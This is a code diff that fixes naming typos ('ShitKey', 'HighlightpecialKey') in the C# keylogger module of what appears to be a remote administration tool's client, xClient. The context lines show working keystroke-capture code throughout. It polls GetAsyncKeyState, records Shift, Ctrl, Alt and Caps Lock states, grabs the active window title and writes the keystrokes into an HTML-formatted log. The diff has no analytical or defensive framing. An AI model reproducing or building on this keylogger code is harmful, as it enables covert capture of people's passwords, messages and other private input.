@@ -11,7 +11,7 @@ namespace xClient.Core.Keylogger
     public class KeyData
     {
         public short Value { get; set; }
-        public bool ShitKey { get; set; }
+        public bool ShiftKey { get; set; }
         public bool CapsLock { get; set; }
         public bool ControlKey { get; set; }
         public bool AltKey { get; set; }
@@ -157,7 +157,7 @@ namespace xClient.Core.Keylogger
             this._logFileBuffer = new StringBuilder();
         }
 
-        private string HighlightpecialKey(string name)
+        private string HighlightSpecialKey(string name)
         {
             return string.Format("<font color=\"0000FF\">[{0}]</font>", name);
         }
@@ -177,23 +177,23 @@ namespace xClient.Core.Keylogger
                         switch (k.Value)
                         {
                             case 8:
-                                _logFileBuffer.Append(HighlightpecialKey("Back"));
+                                _logFileBuffer.Append(HighlightSpecialKey("Back"));
                                 break;
                             case 9:
-                                _logFileBuffer.Append(HighlightpecialKey("Tab"));
+                                _logFileBuffer.Append(HighlightSpecialKey("Tab"));
                                 break;
                             case 13:
-                                _logFileBuffer.Append(HighlightpecialKey("Enter"));
+                                _logFileBuffer.Append(HighlightSpecialKey("Enter"));
                                 break;
                             case 32:
                                 _logFileBuffer.Append(" ");
                                 break;
                             case 46:
-                                _logFileBuffer.Append(HighlightpecialKey("Del"));
+                                _logFileBuffer.Append(HighlightSpecialKey("Del"));
                                 break;
                             case 91:
                             case 92:
-                                _logFileBuffer.Append(HighlightpecialKey("Win"));
+                                _logFileBuffer.Append(HighlightSpecialKey("Win"));
                                 break;
                             case 112:
                             case 113:
@@ -206,30 +206,30 @@ namespace xClient.Core.Keylogger
                             case 120:
                             case 121:
                             case 122:
-                                _logFileBuffer.Append(HighlightpecialKey("F" + (k.Value - 111)));
+                                _logFileBuffer.Append(HighlightSpecialKey("F" + (k.Value - 111)));
                                 break;
                             default:
                                 if (_enumValues.Contains(k.Value))
                                 {
-                                    if (k.AltKey && k.ControlKey && k.ShitKey)
+                                    if (k.AltKey && k.ControlKey && k.ShiftKey)
                                     {
-                                        _logFileBuffer.Append(HighlightpecialKey("SHIFT-CTRL-ALT-" + FromKeys(k.Value, k.ShitKey, k.CapsLock)));
+                                        _logFileBuffer.Append(HighlightSpecialKey("SHIFT-CTRL-ALT-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
                                     }
-                                    if (k.AltKey && k.ControlKey && !k.ShitKey)
+                                    if (k.AltKey && k.ControlKey && !k.ShiftKey)
                                     {
-                                        _logFileBuffer.Append(HighlightpecialKey("CTRL-ALT-" + FromKeys(k.Value, k.ShitKey, k.CapsLock)));
+                                        _logFileBuffer.Append(HighlightSpecialKey("CTRL-ALT-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
                                     }
                                     if (k.AltKey && !k.ControlKey)
                                     {
-                                        _logFileBuffer.Append(HighlightpecialKey("ALT-" + FromKeys(k.Value, k.ShitKey, k.CapsLock)));
+                                        _logFileBuffer.Append(HighlightSpecialKey("ALT-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
                                     }
                                     if (k.ControlKey && !k.AltKey)
                                     {
-                                        _logFileBuffer.Append(HighlightpecialKey("CTRL-" + FromKeys(k.Value, k.ShitKey, k.CapsLock)));
+                                        _logFileBuffer.Append(HighlightSpecialKey("CTRL-" + FromKeys(k.Value, k.ShiftKey, k.CapsLock)));
                                     }
                                     else
                                     {
-                                        _logFileBuffer.Append(FromKeys(k.Value, k.ShitKey, k.CapsLock));
+                                        _logFileBuffer.Append(FromKeys(k.Value, k.ShiftKey, k.CapsLock));
                                     }
                                 }
                                 break;
@@ -247,7 +247,7 @@ namespace xClient.Core.Keylogger
             {
                 if (GetAsyncKeyState(i) == -32767) //GetAsycKeyState returns -32767 to indicate keypress
                 {
-                    _keyBuffer.Add(new KeyData() {CapsLock = CapsLock, ShitKey = ShiftKey, ControlKey = ControlKey, AltKey = AltKey, Value = i});
+                    _keyBuffer.Add(new KeyData() {CapsLock = CapsLock, ShiftKey = ShiftKey, ControlKey = ControlKey, AltKey = AltKey, Value = i});
                     _hWndTitle = GetActiveWindowTitle(); //Get active thread window title
                     if (_hWndTitle != null)
                     {
